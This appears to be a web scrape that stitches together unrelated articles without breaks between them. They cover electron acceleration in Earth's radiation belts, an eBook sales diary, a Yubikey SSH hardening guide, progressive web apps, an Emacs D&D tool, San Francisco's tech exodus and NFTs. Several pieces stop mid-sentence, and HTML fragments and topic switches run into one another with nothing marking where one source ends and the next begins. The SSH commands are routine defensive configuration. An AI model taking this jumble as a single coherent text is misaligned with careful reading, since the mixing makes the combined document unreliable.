<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p><b>New study found that electrons can reach ultra-relativistic energies for very special conditions in the magnetosphere when space is devoid of plasma</b></p><p>Recent measurements from NASA’s Van Allen Probes spacecraft showed that electrons can reach ultra-relativistic energies flying at almost the speed of light. Hayley Allison, Yuri Shprits and collaborators from the German Research Centre for Geosciences have revealed under which conditions such strong accelerations occur. They had already demonstrated in 2020 that during solar storm plasma waves play a crucial role for that. However, it was previously unclear why such high electron energies are not achieved in all solar storms. In the journal Science Advances, Allison, Shprits and colleagues now show that extreme depletions of the background plasma density are crucial.  
</p><p><b>Ultra-relativistic electrons in space </b></p><p>At ultra-relativistic energies, electrons move at almost the speed of light. Then the laws of relativity become most important. The mass of the particles increases by a factor ten, time is slowing down, and distance decreases. With such high energies, charged particles become most dangerous to even the best protected satellites. As almost no shielding can stop them, their charge can destroy sensitive electronics. Predicting their occurrence - for example, as part of the observations of space weather practised at the GFZ - is therefore very important for modern infrastructure. 
</p><p>To investigate the conditions for the enormous accelerations of the electrons, Allison and Shprits used data from a twin mission, the "Van Allen Probes", which the US space agency NASA had launched in 2012. The aim was to make detailed measurements in the radiation belt, the so-called Van Allen belt, which surrounds the Earth in a donut shape in terrestrial space. Here - as in the rest of space - a mixture of positively and negatively charged particles forms a so-called plasma. Plasma waves can be understood as fluctuations of the electric and magnetic field, excited by solar storms. They are an important driving force for the acceleration of electrons.  
</p><p><b>Data analysis with machine learning </b></p><p>During the mission, both solar storms that produced ultra-relativistic electrons and storms without this effect were observed. The density of the background plasma turned out to be a decisive factor for the strong acceleration: electrons with the ultra-relativistic energies were only observed to increase when the plasma density dropped to very low values of only about ten particles per cubic centimetre, while normally such density is five to ten times higher.  Using a numerical model that incorporated such extreme plasma depletion, the authors showed that periods of low density create preferential conditions for the acceleration of electrons - from an initial few hundred thousand to more than seven million electron volts. To analyse the data from the Van Allen probes, the researchers used machine learning methods, the development of which was funded by the GEO.X network. They enabled the authors to infer the total plasma density from the measured fluctuations of electric and magnetic field.  
</p><p><b>The crucial role of plasma </b></p><p>"This study shows that electrons in the Earth's radiation belt can be promptly accelerated locally to ultra-relativistic energies, if the conditions of the plasma environment - plasma waves and temporarily low plasma density - are right. The particles can be regarded as surfing on plasma waves. In regions of extremely low plasma density they can just take a lot of energy from plasma waves. Similar mechanisms may be at work in the magnetospheres of the outer planets such as Jupiter or Saturn and in other astrophysical objects”, says Yuri Shprits, head of the GFZ section Space physics and space weather and Professor at University of Potsdam.  “Thus, to reach such extreme energies, a two-stage acceleration process is not needed, as long assumed - first from the outer region of the magnetosphere into the belt and then inside. This also supports our research results from last year," adds Hayley Allison, PostDoc in the Section Space physics and space weather.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
   <article>

        

        <section>
            <div><p>I wanted to write to you all and share that I've launched my first eBook called <a href="https://gumroad.com/l/serverless-for-everyone-else">"Serverless For Everyone Else"</a> - within the first three hours of launch, nobody bought a single copy and I thought that I'd got it all wrong.</p>
<p>The "everyone else" is a reference to how complicated and difficult cloud-based and Kubernetes-based FaaS has become. The eBook sets out to help indie developers, and individuals within corporations build and deploy functions using a new version of OpenFaaS (<a href="https://github.com/openfaas/faasd">faasd</a>) which is open source and can run on a single VM or VPS without much overhead.</p>
<p>The real power of functions comes in extending existing systems through webhooks, polling, or querying and updating state. I'll share some of these use-cases below including how I used functions to extend how the Gumroad marketplace worked.</p>
<h2 id="whywriteanebookanyway">Why write an eBook anyway?</h2>
<p>Why did I decide to write an eBook? If you've ever written about tech or spoken at a conference, then Packt has probably approached you on LinkedIn about writing for them. From what I hear, that kind of arrangement means writing in a word doc, with tight deadlines and cranking out 300+ pages. It wasn't for me.</p>
<p>I'd seen <a href="https://twitter.com/dvassallo">Daniel Vassallo</a> create an eBook about AWS and Twitter. Daniel had really good results using Gumroad to sell his self-published eBooks. Then there's <a href="https://twitter.com/adamwathan">Adam Wathan</a> who built Tailwind CSS and trained himself up as a UI designer. He wrote his own eBook and in his yearly review mentioned that it did 600k USD in passive sales, without any promotion.</p>
<p>Whilst I didn't expect to get anywhere close to those numbers with a specialist topic, I did want to know if people would buy something from me.</p>
<h2 id="thetiersatlaunch">The tiers at launch</h2>
<p>I launched with three tiers, with names and clear differentiation:</p>
<ul>
<li>Minimalist - 25 USD - just the eBook</li>
<li>DevOps PRO - 50 USD - the eBook, plus a Grafana dashboard and the YAML for faasd to enable it</li>
<li>The learner - 99 USD - the eBook, plus a Grafana dashboard,  the YAML for faasd to enable it and a video workshop ready in 7 days</li>
<li>The team player - the learner, but for 5 people in your company</li>
</ul>
<p>As long as your options add some value, it seems that people enjoy the choice and are willing to pay a little more.</p>
<p>So I tweeted about the eBook and then nothing happened for three hours.</p>
<p>I interpreted this as a failure. I'd been reading <a href="https://amzn.to/38N5uZy">"The Right It: Why So Many Ideas Fail and How to Make Sure Yours Succeed"</a>, and had convinced myself that this was a sign that nobody wanted the material.</p>
<p>Then I got my first sale, and felt a little relief, maybe I was wrong?</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810538-27b57080-57ed-11eb-905b-d042d3046adf.png" alt="Sale email"></p>
<p>My sales graph had one initial spike on the Friday, and kept going into the Sunday. What had happened? My Twitter audience and GitHub Sponsors came to lend their support.</p>
<p><img src="https://pbs.twimg.com/media/ErzMnuOXMAA_REk?format=jpg&amp;name=medium" alt="Initial spike"></p>
<p>Then things died down, and over the course of the week I wondered if I'd failed to find market fit. <a href="https://gumroad.com/">Gumroad</a> was sending me almost no organic traffic, and nobody was landing on the page via SEO.</p>
<p>It was still more money than I had expected to earn from the eBook within the first week, but I felt like with so much interest in OpenFaaS, that there was a broader audience to reach.</p>
<h2 id="gettingasecondpeak">Getting a second peak</h2>
<p>After the first week, I released the video workshop to the people who'd purchased that tier (99USD), and to get some feedback, I offered a free upgrade to the workshop for the tier just below (50USD). That resulted in another large spike in interest.</p>
<p><img src="https://camo.githubusercontent.com/4e204e93dcfc33679c997c739fbf4f651fdf268d23961bae6f9b4c25ad4ec145/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f45735a3372753258634155513451673f666f726d61743d6a7067266e616d653d6d656469756d" alt="Video workshop"></p>
<p>How did I fulfil the upgrade / discount? I did it by writing a function and deploying it to my Raspberry Pi, so that Gumroad would send a webhook, my code would query the dollar amount, and then send out an email to the customer over AWS SES.</p>
<p><img src="https://pbs.twimg.com/media/EscxNxbXAAEHD8z?format=jpg&amp;name=large" alt="The function running"></p>
<p>Get the source code here: <a href="https://github.com/alexellis/gumroad-responder">alexellis/gumroad-responder</a></p>
<p>After the second peak, I saw a complete drop-off again - and started to wonder why?</p>
<p>99% of referrals came from Twitter and email, so had I exhausted my network?</p>
<p>I went ahead and added a link on openfaas.com and on my blog at the end of each post, to try and get more views on the eBook. It's too early to tell if that is going to work out, but has resulted in a few conversions already.</p>
<p>One of the bits of feedback I got on the eBook was how users enjoyed the use-cases, and practical examples. I'd recently started video streaming, so invited a friend to my YouTube channel to talk about serverless use-cases.</p>
<p><img src="https://camo.githubusercontent.com/544dffaf339a4ff44439db1c14cd953de385640b99231688f8a49db61294a02e/68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f457378444745505841415968724c4f3f666f726d61743d6a7067266e616d653d6c61726765" alt="Video on use-cases"></p>
<p><a href="https://www.youtube.com/watch?v=mzuXVuccaqI&amp;feature=youtu.be">Watch the recording</a></p>
<p>The recording generated a lot of interest and engagement for existing eBook customers, but no additional sales.</p>
<p>You can get the <a href="https://gist.github.com/alexellis/c72d7a385f801cc9b8deb7fcaa531b69">show notes</a> here which have lots of links for use-cases from hobbyists, indie devs and corporate users of OpenFaaS.</p>
<h2 id="mynextmilestone">My next milestone</h2>
<p>I am pleased with the results so far, and have learned a lot along the way. I also had a few people reach out to me directly asking for help who had taken inspiration from seeing someone actually go ahead and take a calculated risk.</p>
<p>I haven't quite got to 10k USD, which is a nice round number to aim for, but I can roughly understand what each peak means here, and whether they are repeatable.</p>
<p><img src="https://pbs.twimg.com/media/EtARGclXMAg7nJ-?format=jpg&amp;name=medium" alt="Approaching 10k"></p>
<p>Once the sales do cross that threshold, I'll write-up a how to guide and share the command lines and tools I used to generate the eBook.</p>
<h2 id="whatsnext">What's next</h2>
<p>I committed to providing free updates - because the eBook was partially experimental and I wanted to validate that it was useful. Using the <a href="https://slack.openfaas.io/">OpenFaaS Slack</a> helped here - I opened a new channel for people who'd bought the book, and enjoyed the feedback and engagement from this.</p>
<p>Some people charge extra for community, but it felt too hard to enforce the access for this.</p>
<p><img src="https://user-images.githubusercontent.com/6358735/104810333-b628f280-57eb-11eb-8be9-a2f6c773346b.png" alt="Original cover"></p>
<p>I generated my own eBook cover originally and then only later, got a professional designer involved.</p>
<p><img src="https://static-2.gumroad.com/res/gumroad/2028406193591/asset_previews/741f2ad46ff0a08e16aaf48d21810ba7/retina/social4.png" alt="New design"></p>
<p>It turns out that the cover may not matter with Gumroad, as long as it's not awful. Since changing cover, I've only seen two new sales.</p>
<p>Now that I have some initial feedback and have learned that people will buy things from me, I want to let goodwill rebuild, and my audience "recover" before launching a second eBook. I've done a lot of free blog posts and writing on Kubernetes, Docker, Golang and Raspberry Pi and analytics from my blog shows me what's popular.</p>
<blockquote>
<p>In 14 days, I've received more money than OpenFaaS corporate users have paid into the project over 4 years.</p>
</blockquote>
<p>Just because something you give away for free is popular, doesn't mean that anyone will be willing to pay for it. OpenFaaS itself is testament to that, with many corporations using it in production, without contributing code or finances back.</p>
<p>The Right It has taught me not to invest too much effort up front in any one idea - as it's likely to fail. Instead I'll be testing ideas - getting feedback by investing a few hours or days, not weeks.</p>
<p>I am sure I've missed out lots of details here, so feel free to ask me questions.</p>

			<p>One recently-completed project I mentioned in January’s <a href="https://www.dzombak.com/blog/2021/01/Now-Jan-2021.html">“Now” post</a> was locking down SSH in my personal computing infrastructure using Yubikeys. In this post, I’ll outline my goals, the strategy I took, and the problems and solutions I ran into along the way.</p>

<h2>Goals &amp; Strategy</h2>

<p>Historically, I’ve used a pretty basic SSH setup for my personal projects: my user account on every laptop/desktop/server had its own key in <code>~/.ssh</code>, and I’d try to keep the <a href="https://www.ssh.com/ssh/authorized_keys/"><code>authorized_keys</code></a> lists on all my servers more-or-less up-to-date. This presents a number of obvious security problems.</p>

<p>I wanted to ensure that, should an attacker gain access to one of my servers, they can’t use that access to move onto any other computer I control. To do this, I moved to using a few <a href="https://www.yubico.com/">Yubikeys</a> to store my SSH keys; there’s no longer key material stored on any server for a hypothetical attacker to steal. The Yubikeys require a PIN, so this is an example of two-factor authentication: something I physically have, and something I know.</p>

<p><a href="https://www.cloudsavvyit.com/25/what-is-ssh-agent-forwarding-and-how-do-you-use-it/">SSH agent forwarding</a> is used to allow me to SSH from one server to another or fetch code from GitHub on a remote server. With <a href="https://github.com/FiloSottile/yubikey-agent"><code>yubikey-agent</code></a>, my preferred agent software, every single SSH operation — yes, even those performed via agent forwarding — requires a physical touch to confirm.</p>

<p>I use a private Git repository to synchronize SSH configuration (including <code>authorized_keys</code>, the list of public keys corresponding to my Yubikeys) between machines, with a modular local configuration system allowing me to quickly enable commonly-used SSH configuration blocks which only apply to a subset of my machines.</p>

<h2>Implementation</h2>

<h3>Yubikeys</h3>

<p>I found it easiest by far to use <a href="https://github.com/FiloSottile/yubikey-agent"><code>yubikey-agent</code></a> for this project. It’s pretty straightforward to set this up; the real work was figuring out how to smooth out the various difficulties I encountered later.</p>

<p>(The commands and configuration changes under this heading apply to client machines with attached Yubikeys.)</p>

<p>Install <code>yubikey-agent</code> with <a href="https://brew.sh/">Homebrew</a>:</p>

<pre><code>brew tap filippo.io/yubikey-agent https://filippo.io/yubikey-agent
brew install yubikey-agent
brew services start yubikey-agent
</code></pre>

<p>Run <code>yubikey-agent -setup</code> to generate a new SSH key on your Yubikey.</p>

<p>Set the <code>SSH_AUTH_SOCK</code> environment variable (do this in your <code>.bashrc</code> or <code>.zshrc</code>). In <a href="https://github.com/cdzombak/dotfiles/blob/800ca4e760da36171643e8a116e038cc4c4dcf31/zsh/.zshrc#L24">my dotfiles</a>, I first check that <code>yubikey-agent</code> is installed, then proceed:</p>

<pre><code>command -v yubikey-agent &gt;/dev/null 2&gt;&amp;1 &amp;&amp; export SSH_AUTH_SOCK="/usr/local/var/run/yubikey-agent.sock"
</code></pre>

<p>Enable SSH agent forwarding for a specific, trusted host (don’t enable it for all hosts; that’s a potential security issue) by adding <code>ForwardAgent yes</code> to that host’s block in your <code>~/.ssh/config</code>. A complete example might look like:</p>

<pre><code>Host dzombak.com
    User chris
    HostName dzombak.com
    ForwardAgent yes
</code></pre>

<p>This is a bit of a spoiler for a topic later in this blog post, but we’ll also add this to our <code>~/.ssh/config</code>:</p>

<pre><code>Host *
    IdentityAgent /usr/local/var/run/yubikey-agent.sock
</code></pre>

<p>This allows apps started from outside your terminal — like the GUI Git client, <a href="https://fork.dev/">Fork.app</a> — to find and use <code>yubikey-agent</code>.</p>

<h4>A note: Secretive.app</h4>

<p>I’d like to use the new macOS app <a href="https://github.com/maxgoedjen/secretive">Secretive</a>, which stores SSH keys in the Secure Enclave on newer MacBooks and requires Touch ID to authenticate. Unfortunately, for Reasons™ I’m still using macOS Mojave, and Secretive requires Catalina or Big Sur. I plan to move to Big Sur soon enough, since I want to get an M1 MacBook Pro when the 16” models are released, so I’ll be able to try Secretive soon enough. (Worth noting, this changes the security model somewhat, as the second factor is biometric rather than a PIN, but it’s still two factors.)</p>

<h3>Server Configuration</h3>

<p>Of course, moving to Yubikeys doesn’t solve much if your servers still allow password logins. On every server, in <code>/etc/ssh/sshd_config</code>, I set the following. Make this change only after you’ve set up a Yubikey and added it to <code>authorized_keys</code> for your user account on the server!</p>

<pre><code>ChallengeResponseAuthentication no
PasswordAuthentication no
PermitRootLogin no
</code></pre>

<p>(That last line — <code>PermitRootLogin no</code> — ensures that logins as <code>root</code> via SSH are never allowed, which is a good SSH best practice unrelated to Yubikeys.)</p>

<p><a href="https://www.cyberciti.biz/faq/howto-restart-ssh/">Restart the SSH service</a>, and immediately — before logging out — open a new terminal window and test that you can still login to the server with your Yubikey.</p>

<p>macOS tends to lose changes to <code>sshd_config</code> during OS upgrades, so after installing macOS updates I make sure to check that my SSH server configuration is intact.</p>

<h3>Git repo for SSH configuration</h3>

<p>I keep my <code>~/.ssh</code> directory, with a few important exceptions (keys are never committed!), in a private Git repo. This allows me to sync configuration and <code>authorized_keys</code> changes between systems easily. I’ve created a stripped-down version at <a href="https://github.com/cdzombak/ssh-example">cdzombak/ssh-example</a> which you can use as a basis for your own setup.</p>

<p>I’ll walk through the highlights here:</p>

<ul>
<li><a href="https://github.com/cdzombak/ssh-example/blob/main/README.md"><code>README.md</code></a> covers initial installation &amp; setup.</li>
<li><a href="https://github.com/cdzombak/ssh-example/blob/main/authorized_keys"><code>authorized_keys</code></a> is where you’ll add the public keys associated with the new, private SSH keys on your Yubikeys.</li>
<li><a href="https://github.com/cdzombak/ssh-example/blob/main/config"><code>config</code></a> is where you’ll add <code>Host</code> blocks for your servers. At the top, it sets some SSH best practices that I’ve accumulated over the years.</li>
<li><a href="https://github.com/cdzombak/ssh-example/blob/main/fix-permissions.sh"><code>fix-permissions.sh</code></a> ensures that <code>~/.ssh/authorized_keys</code> and <code>~/.ssh/rc</code> have the correct permissions. I run this after pulling from the repository; if it results in any changes the files’ permissions in the repo should be corrected.</li>
<li><a href="https://github.com/cdzombak/ssh-example/blob/main/rc"><code>rc</code></a> runs after I log into a machine via SSH. In this case, it updates a symlink in <code>~/.ssh/sock</code> to point to the new SSH agent socket. See the “Long-lived <code>screen</code> sessions” section, below, for an explanation on why this is necessary.</li>
<li><a href="https://github.com/cdzombak/ssh-example/tree/main/config.templates"><code>config.templates/</code></a> contains SSH configuration blocks which <em>can</em> be included on a given machine, but shouldn’t be included everywhere. The most important of these are <a href="https://github.com/cdzombak/ssh-example/blob/main/config.templates/yubikey-agent"><code>yubikey-agent</code></a>, which when enabled sets <code>IdentityAgent</code> to the <code>yubikey-agent</code> socket as described above; and <a href="https://github.com/cdzombak/ssh-example/blob/main/config.templates/homedir-ssh-auth-sock"><code>homedir-ssh-auth-sock</code></a>, which sets <code>IdentityAgent</code> to the symlink <code>rc</code> creates after an SSH login. On any given machine, I enable one and only one of these two configurations, depending whether it’s a client machine with Yubikey attached or a server which will rely on agent forwarding for any outgoing SSH connections.</li>
<li><a href="https://github.com/cdzombak/ssh-example/tree/main/config.local"><code>config.local/</code></a> is <a href="https://github.com/cdzombak/ssh-example/blob/main/config#L2">included by</a> <code>config</code> and ignored by Git. I can add symlinks from here to <code>config.templates</code> to enable a specific SSH configuration block on the machine.</li>
</ul>


<p>Those last two — <code>config.local</code> and <code>config.templates</code> — are important, because that’s how I achieve variations in SSH configuration between different machines. <a href="https://github.com/cdzombak/ssh-example/blob/main/README.md#configuration">The README covers</a> how to enable config templates on a given computer.</p>

<h2>Challenges &amp; Solutions</h2>

<h3>Long-lived <code>screen</code> sessions</h3>

<p>I use GNU <code>screen</code> (yes, still; I haven’t bothered to learn <code>tmux</code>) as a terminal multiplexer and to provide persistence between SSH sessions. This was a problem for SSH agent forwarding: when I first SSH in and start a <code>screen</code> session, the <code>SSH_AUTH_SOCK</code> environment variable would be set. But when I logged in from somewhere else and reattached to the <code>screen</code> session, the <code>SSH_AUTH_SOCK</code> environment variable wouldn’t get updated, so SSH agent forwarding was broken until I started a new <code>screen</code> session.</p>

<p><a href="https://gist.github.com/martijnvermaat/8070533">This Gist</a> helped me fix this situation. There are a few parts to this solution. (The commands and configuration changes under this heading apply to servers you’ll SSH into.)</p>

<p>First, we have to have a location for our SSH agent socket that doesn’t change between logins. These few lines in <a href="https://github.com/cdzombak/ssh-example/blob/main/rc#L5-L7"><code>~/.ssh/rc</code></a> achieve this:</p>

<pre><code>if test "$SSH_AUTH_SOCK" ; then
    ln -sf "$SSH_AUTH_SOCK" ~/.ssh/sock/ssh_auth_sock
fi
</code></pre>

<p>Great! Then we just need clients to use this new, always-updated socket. To do this, we configure <a href="https://github.com/cdzombak/dotfiles/blob/800ca4e760da36171643e8a116e038cc4c4dcf31/screen/.screenrc#L31-L32"><code>~/.screenrc</code></a> to set the environment variable <code>SSH_AUTH_SOCK</code>:</p>

<pre><code>setenv SSH_AUTH_SOCK $HOME/.ssh/sock/ssh_auth_sock
</code></pre>

<p>Finally, we’ll also want to include <code>IdentityAgent ~/.ssh/sock/ssh_auth_sock</code> in our SSH configuration. We can do this by including the <code>homedir-ssh-auth-sock</code> configuration block within my <a href="https://github.com/cdzombak/ssh-example">modular SSH configuration</a> setup:</p>

<pre><code>cd ~/.ssh/config.local
ln -s ../config.templates/homedir-ssh-auth-sock .
</code></pre>

<h3>SSH agent forwarding when running commands under sudo</h3>

<p>When running a command with <code>sudo</code>, you’re working in a new environment; your user’s environment variables are not preserved. This will, of course, break SSH agent forwarding.</p>

<p>To solve this, we want to preserve the <code>SSH_AUTH_SOCK</code> environment variable when using <code>sudo</code>. (The commands and configuration changes under this heading apply to servers you’ll SSH into.)</p>

<p>Run <code>visudo</code> (as <code>root</code>) to edit your <code>sudoers</code> file, and add:</p>

<pre><code>Defaults&gt;root    env_keep+=SSH_AUTH_SOCK
</code></pre>

<p>This means that when using <code>sudo</code> to run a command as <code>root</code> (not as any other user), your <code>SSH_AUTH_SOCK</code> variable remains intact, and agent forwarding works as expected.</p>

<h3>SSH agent forwarding via <code>SSH_AUTH_SOCK</code> doesn’t work with GUI macOS apps</h3>

<p><a href="https://github.com/ForkIssues/Tracker/issues/44">This issue in the Fork app’s issue tracker</a> was really helpful here. <code>.bashrc</code> and <code>.zshrc</code> don’t apply to GUI apps (unless you launch them from the terminal), so setting <code>SSH_AUTH_SOCK</code> <em>only</em> in shell configuration files won’t work.</p>

<p>This is why we need <code>IdentityAgent /usr/local/var/run/yubikey-agent.sock</code> in our SSH configuration. To enable this within my <a href="https://github.com/cdzombak/ssh-example">modular SSH configuration</a> setup:</p>

<pre><code>cd ~/.ssh/config.local
ln -s ../config.templates/yubikey-agent .
</code></pre>

<p>(This change applies to macOS client machines with attached Yubikeys.)</p>

<h3>Avoiding repeated mystery Yubikey prompts (using HTTPS for GitHub and Bitbucket repositories)</h3>

<p>After I set this up, my Yubikey would periodically blink as if I were trying to SSH into something, but I hadn’t tried to do anything with SSH! That was worrying, until I realized it was just <a href="https://fork.dev/">Fork</a> trying to update repository info in the background.</p>

<p>I decided to configure Git on my laptops to use HTTPS instead of SSH when communicating with GitHub and Bitbucket, so Fork can work in the background as it desires.</p>

<p>To do this, we’ll add the following to <code>~/.gitconfig</code>. (This …</p></article></div>

<p><i>PWAs are powerful, effective, fast and app-like. It's hard to imagine a mobile web property that could not be significantly improved via PWA implementation. They can also potentially eliminate the need for many vanity native apps that exist today. progressive web apps are for everyone, desktop and mobile users alike. I think it’s important to reiterate that there is no mobile web.</i></p>

<p>Progressive web apps have taken functionality from both native and web apps. They can run fast regardless of mobile operating systems and device types also providing rich functionality as if they were developed for a specific device. Thanks to easy installation, discoverability, automated updates, slow network or even the offline work mode, PWAs can enhance user experience.</p>

<h3 id="Low_Development_Costs">Low Development Costs</h3>
<p>PWAs do not require different versions for various devices; a single progressive app meets the requirements of all endpoints on which it operates. So, it significantly reduces the amount of efforts that developers provide, and as a result, the cost to create a PWA decreases. The cost is three or four times lower than that of a native mobile app.</p>
</section>
<section>
<h3 id="App_Like_Look_and_Feel">App-Like Look and Feel</h3>
<p>Nowadays, mobile users prefer apps to browsers as applications compare favorably with browsers, as they are more user-friendly, can operate offline and have a more attractive interface. Progressive web applications provide an advanced user experience by combining the look and feel of mobile applications and the best of website performance.</p>
</section>
 <section>
<h3 id="Fast_Installation">Fast Installation</h3>
<p>Unlike regular mobile applications, PWAs do not require a long and complex installation process, which significantly improves user experience. Users just download an app, quickly and directly to their devices, and they do not need to go to the App Store or Google Play. It streamlines the procedure and significantly reduces user abandonment.</p>

<h3 id="Issues_with_legacy_devices">Issues with legacy devices</h3>
<p>PWAs have been around for just a few years, so it shouldn’t come as a surprise that older mobile devices with outdated web browsers don’t support them too well. While this problem will inevitably solve itself in the future</p>

<p>Their performance is also not as good as the performance of native apps, which has a lot to do with the fact that JavaScript is a single-threaded programming language.

<p>Progressive Web App (PWA) is a web app, developed with features which give it an app like experience while browsing. PWA improves the user experience to the extent that users can feel the same as they do while using native apps.</p>

<h2>Description</h2>

<p>org-d20 is a minor mode for Emacs’ <a href="https://orgmode.org/">Org-mode</a>
for GMs running games whose rules centre around rolling d20s.  It
should be useful for <em>Dungeons and Dragons</em> 3rd, 4th and 5th editions,
Paizo’s <em>Pathfinder</em>, and
<a href="https://en.wikipedia.org/wiki/D20_System">d20 System</a> games like <em>d20
Modern</em>.</p>

<p>The idea is that you’re already keeping your campaign notes in an
Org-mode file.  This minor mode does useful things for you while you
are visiting that buffer.  For example,</p>

<ul>
<li><p>rolling dice, with 5e’s advantage and disadvantage displayed in case
those are needed;</p></li>
<li><p>tracking combat turns and rounds right next to your existing
description of the monsters and the terrain.</p></li>
</ul>


<p>The minor mode’s defaults suit the way that I run D&amp;D 5e.  Patches to
add <code>defcustoms</code> to make org-d20 more suitable for other games, and
other sets of house rules, are welcome.</p>

			<p><span>For almost as long as we’ve been tracking the COVID-19 pandemic, sf.citi has been closely monitoring the San Francisco tech exodus. Of course, some of the forces driving this phenomenon—remote work and the growing appeal of cities beyond San Francisco—predate 2020. Few can argue, however, that the pandemic has accelerated these trends. What we’re seeing today is nothing short of a mass migration of tech companies and tech employees outside of the San Francisco Bay Area.</span></p>
<p><span>To help you keep up with fast-moving data surrounding the San Francisco tech exodus, sf.citi created an all-in-one resource. Below, you’ll find the latest insights about tech’s relocation, the economic implications of a tech exodus in San Francisco, and context around the policies that have led us to where we are today.</span></p>

<li>According to <a href="https://www.cushmanwakefield.com/en/united-states/insights/us-marketbeats/us-office-marketbeat-reports">data from Cushman &amp; Wakefield</a>, San Francisco’s office vacancy rate has risen to 16.7 percent, surpassing levels after both the 2008 Great Recession and the dot-com bust. San Francisco also recorded the lowest level of new leasing activity since at least the 1990s.</li>
<li>The Bay Area’s proportion of VC deal count in 2021 is expected to <a href="https://www.cnbc.com/2021/01/14/silicon-valleys-share-of-venture-capital-may-drop-below-20percent-in-2021.html" target="_blank" rel="noopener">fall below 20 percent</a> for the first time in history. “The COVID-19 pandemic and subsequent exodus from San Francisco will only exacerbate this trend,” writes VC analyst Kyle Stanford in PitchBook’s <a href="https://pitchbook.com/news/reports/q4-2020-pitchbook-analyst-note-2021-us-venture-capital-outlook" target="_blank" rel="noopener">2021 US Venture Capital Outlook report</a>.</li>

That’s on top of the $1.5 billion budget deficit the City had to close in 2020. And in a </span><a href="https://sfcontroller.org/sites/default/files/Documents/Budget/Five%20Year%20Financial%20Plan%20FY21-22%20through%20FY%2025-26.pdf"><span>five-year budget forecast</span></a><span>, the City Controller’s Office predicts hundreds of millions of dollars in budget shortfalls over the next five years due to a widening gap between the City’s revenues and expenses.</span></li>
<li><span>Current and future San Francisco budget deficits are directly tied to losses in hotel, business, and sales taxes. The San Francisco Business Times </span><a href="https://www.bizjournals.com/sanfrancisco/news/2021/02/05/0205-foc-sanfrancisco.html"><span>reported</span></a><span> that the City expected close to $1.5 billion in business taxes in 2019-2020 but ended the fiscal year $228 million under budget.</span></li>
<li>From April to June 2020, revenue from San Francisco’s local sales tax dropped to <a href="https://www.sfchronicle.com/business/article/S-F-sales-tax-data-shows-likely-population-15632448.php">$30.8 million</a>, a decrease of 43 percent from 2019. Stay-at-home orders resulted in steep declines in brick-and-mortar sales taxes throughout the Bay Area. All of the counties surrounding San Francisco, however, saw increases in online sales taxes while San Francisco registered only a <a href="https://www.sfchronicle.com/business/article/Yes-people-are-leaving-San-Francisco-After-15635160.php">1 percent increase</a>—the worst showing among California’s 20 largest counties. Speaking to the <a href="https://www.sfchronicle.com/business/article/S-F-sales-tax-data-shows-likely-population-15632448.php">San Francisco Chronicle,</a> San Francisco Chief Economist Ted Egan attributes the drop in revenue to “tech people moving.”</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><h3>What are NFTs?</h3>
<p>Non-fungible token (NFT) is a term used to describe a unique digital asset whose ownership is tracked on a blockchain, such as Ethereum. Assets that can be represented as NFTs range from digital goods, such as items that exist within virtual worlds, to claims on physical assets such as clothing items or real estate. In the coming years, we will see NFTs used to unlock entirely new use cases that are only made possible by crypto.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/9799dae1-c2c9-4712-813b-10b23c279a36.jpeg" alt="Tokens redeemable for real world goods on Zora"></p><figcaption>Tokens redeemable for real world goods on Zora</figcaption></figure>
<p>While the Ethereum ecosystem is where most NFT activity has taken place to date, NFTs can exist on other smart contract platforms too. This is because, at their core, NFTs are just digital abstractions used to represent assets that are one of a kind. Non-fungible token isn’t the most intuitive term since we don’t commonly refer to the fungibility of objects in the physical world, but this is an important technical distinction when it comes to how an asset is represented on a blockchain. The goal for this post is not to detail every project within the NFT space, but to give a high level overview of what NFTs are, why they are interesting, and showcase some of their potential use cases.</p>
<h3>Why are NFTs interesting?</h3>
<p>NFTs are powerful because, when combined with other financial building blocks on Ethereum, they allow anyone to issue, own, and trade them. This makes interacting with NFTs significantly more efficient than in traditional platforms. The same reason why cryptocurrency used in payments is more efficient than traditional payments, that it is borderless and significantly easier to transfer, applies to NFTs. For example, if you want to create tradable in-game items as a game developer, then you can instantly have them be tradable through protocols that allow for decentralized exchange of NFTs. You don’t have to create your own marketplace or go through the onboarding process of a centralized platform in order to have the items be tradable.</p>
<p>NFT activity can go well past trading and include actions like being able to borrow and lend, support fractional ownership (e.g. <a href="https://www.niftex.com/">NIFTEX</a>), or use it as collateral in taking out a loan (e.g. <a href="https://nftfi.com/">NFTfi</a>). The possibilities are endless when you have the ability to combine NFTs with DeFi building blocks. For example, the game <a href="http://aavegotchi.com/">Aavegotchi</a> combines DeFi and NFT gaming where each Aavegotchi character represents a user’s collateral that is deposited within the lending platform <a href="https://aave.com/">Aave</a>, but you can also battle the characters, level them up, and equip wearables that change their traits.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a1259686-6b61-455a-a204-f6e6da648f10.jpeg" alt="Aavegotchi gaming attributes change based on actions taken in DeFi"></p><figcaption>Aavegotchi gaming attributes change based on actions taken in DeFi</figcaption></figure>
<p>NFTs can cover an extremely wide variety of areas given they are simply digital representations of ownership but there has been significant growth within art and gaming in particular. Note that many digital works of art and gaming items are a subset of a larger category of NFT collectibles. There is also the emerging space of social tokens, which sometimes falls into the NFT category or that is closely related to it.</p>
<h3>Art</h3>
<p>NFTs can make fractionalized ownership more accessible, so if there is a valuable item that otherwise wouldn’t have been accessible for someone to own, now they can own a piece of it. Custody of a physical item still requires a trustworthy custodian, but being able to issue, hold, and trade it as a cryptoasset unlocks more use cases. One can also craft an NFT such that the creator receives a percentage of all secondary sales in a completely automated way. Artists typically don’t receive a cut of secondary sales in the traditional art world.</p>
<p>Programmable art is another interesting concept where a piece of artwork can incorporate on-chain data to dynamically update certain features or characteristics of the work. For example, one could create a piece of programmable art whose background changes if the price of ether goes above a certain dollar-value. There are countless creative possibilities.</p>
<figure><p><img src="https://images.mirror-media.xyz/publication-images/a51670c0-4a1c-4aaf-917d-0e551855b56d.jpeg" alt="Rutger van der Tas artwork that changes based on if it’s day or night"></p><figcaption>Rutger van der Tas artwork that changes based on if it’s day or night</figcaption></figure>
